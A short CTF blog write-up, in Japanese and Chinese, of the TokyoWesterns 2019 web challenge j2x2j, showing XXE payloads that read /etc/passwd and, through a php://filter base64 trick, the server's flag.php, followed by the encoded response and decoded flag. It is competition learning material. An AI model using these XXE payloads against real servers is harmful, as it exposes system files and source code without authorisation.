---
layout: post
title:  TokyoWesterns CTF 5th 2019 Write up
date:   2019-09-03 11:49:50 -0400
categories: CTF
---
今回のTokyoWesterns CTF 5th 2019で、私とSinonさん(遅くて来たｗ)はチームweRubb1shで参加しました。 122 ptsで298位でした。 私は一問を解けただけ。 悔しいです。 

## [Web] j2x2j (Point: 59)

在做pwn的途中卡住了 所以跑去做做web
自己對於XXE是沒什麼認識 這次是第一次動手去做XXE

完結了之後才發現view source的話會看到`include 'flag.php'`
我是在url裡打`/flag.php`才知道有flag.php在 :P
去google裡找到以output出`/etc/passwd`來確定XXE的方法 再在那個json<->xml試試 `/etc/passwd`真的出來了
之後再把website在server的location找出來
如果directory或file不存在的話 `failed to decode xml`會出現
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/sample.json">]>                                                             
<message>
<message>&xxe;</message>
<title>xml</title>
</message>
```
這樣去找出了`sample.json`了

由於flag在寫了在php裡 直接把`sample.json`換成`flag.php`還是會看不到東西
所以用以下的payload把`flag.php`用base64 encode拿出來

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php">]>                                                             
<message>
<message>&xxe;</message>
<title>xml</title>
</message>
```
```json
{
    "message": "PD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsK",
    "title": "xml"
}
```
```php
<?php
$flag = 'TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}';

```
